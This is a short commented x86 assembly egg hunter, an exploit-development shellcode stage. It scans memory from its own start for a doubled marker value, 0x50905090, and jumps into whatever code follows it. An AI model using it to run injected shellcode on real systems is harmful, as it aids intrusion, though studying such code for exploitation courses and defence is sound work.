global _start

_start:
	mov eax, _start 	;initialize eax to the start of the program
	mov ebx, 0x50905090 ;initialize ebx to the egg value "0x50905090"

_lookNextAddr:
	inc eax 			;increment the address memory stores inside eax
	cmp [eax], ebx 		;compare the value inside eax to ebx "0x50905090"
	jne _lookNextAddr 	;if not equal jump "to _lookNextAddr"

	;necessary only if the shellcode to execute has two egg inside
	cmp [eax+0x4], ebx 	;compare the value inside eax+0x4 to ebx "0x50905090"
	jne _lookNextAddr 	;if not equal, jump "to _lookNextAddr"
	jmp eax 			;jump to the shellcode
